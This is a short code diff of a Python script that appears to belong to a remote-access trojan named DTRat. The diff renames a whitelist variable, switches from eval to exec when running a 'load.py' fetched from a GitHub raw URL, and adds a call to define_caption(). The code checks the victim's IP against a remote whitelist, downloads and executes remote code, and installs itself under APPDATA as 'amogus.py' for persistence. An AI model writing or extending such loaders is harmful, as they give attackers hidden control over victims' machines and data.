@@ -14,12 +14,12 @@ while ip == "":
     except:
         print("Connection Error: wait 10sec")
         time.sleep(10)
-whitelist = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/whitelist-ip.txt").split("\n")
+white_list = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/whitelist-ip.txt").split("\n")
 inidata = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time()))
 
-eval(load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)))
+exec(load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)))
 
-if ip in whitelist:
+if ip in white_list:
     print("Whitelist detected!")
     if "whitelist" in dir():
         whitelist()
@@ -92,6 +92,7 @@ if not os.path.exists(os.environ["APPDATA"]+"/amogus.py"):
         first_setup()
     sys.exit(os.system(os.environ["APPDATA"]+"/amogus.py"))
 
+define_caption()
 if "setup" in dir():
         setup()
 
